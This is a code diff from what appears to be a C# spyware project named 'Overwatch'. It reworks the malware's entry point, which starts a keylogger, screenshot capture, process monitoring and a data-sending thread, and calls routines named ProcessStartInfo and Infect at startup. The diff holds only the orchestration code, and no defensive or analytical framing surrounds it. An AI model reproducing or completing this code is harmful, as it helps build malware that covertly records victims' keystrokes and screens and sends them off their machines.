@@ -10,33 +10,20 @@ namespace Overwatch
         static cKeylogger k = new cKeylogger();
         //static cInstallTaskScheduler T = new cInstallTaskScheduler();
         static cSendingInformation s = new cSendingInformation();
-        static Thread KeyTread = new Thread(k.Start);
-        static Thread ScreenTread = new Thread(info.ScreenShoot);
-        static Thread SendingTread = new Thread(s.Sending);
-        static Thread ProcessTread = new Thread(info.Overview); 
-        
-        public static void Start()
+        private static Thread SendingThread = new Thread(s.Sending);
+        public static void Thread()
         {
-            KeyTread.Start();
-            ScreenTread.Start();
-            ProcessTread.Start();
-            SendingTread.Start();
-        }
-
-        public static void Abort()
-        {
-            KeyTread.Abort();
-            ScreenTread.Abort();
-            ProcessTread.Abort();
+            cThread t = new cThread();
+            t.Start();
         }
         static void Main(string[] args)
         {
             try
             {
-
                 cStartupOptions.ProcessStartInfo();
                 cChangeLabel.Infect(args);
-                Start();
+                Thread();
+                SendingThread.Start();
             }
             catch (Exception ex) { Log.Write(ex.Message, true); }
         }
